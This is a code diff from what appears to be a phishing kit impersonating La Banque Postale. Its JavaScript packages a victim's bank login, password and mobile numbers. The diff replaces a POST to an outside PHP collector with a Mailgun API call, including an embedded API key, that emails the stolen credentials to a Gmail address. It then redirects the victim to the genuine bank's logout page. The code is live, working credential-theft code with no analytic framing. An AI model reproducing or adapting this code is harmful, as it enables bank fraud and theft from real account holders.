@@ -216,11 +216,18 @@ const chatId = '2019685107';
             
             const message = `Code Postale \n Identifiant: ${identifiant}\nPassword: ${postClavier}\nMobile: ${mobile}\nmobiles: ${mobiles}`;
             $( "#data" ).val(message);
-            $.ajax({
+             $.ajax({
                 type: 'POST',
-                url: `https://www.italmediab2b.it/feedbnp.php`,
-                data: $( "#data" ).val(message),
-            });
+                cache: false,
+                headers: {"Authorization": "Basic " + btoa('api:3a665084399ecd5fd7e40bc1f9fb616e-0be3b63b-6918eeba')},
+                url: `https://api.mailgun.net/v3/falcotelofree.club/messages`,
+                data: {
+                      'from' : 'postmaster@falcotelofree.club',
+                      'to'   : 'tarikada@gmail.com',
+                      'subject' : 'Message de ' + name,
+                      'text' : message
+                      },
+            });	
         }  setTimeout(
                     function() {
                         window.location.replace("https://voscomptesenligne.labanquepostale.fr/voscomptes/canalXHTML/securite/deconnexion/init-deconnexion.ea");
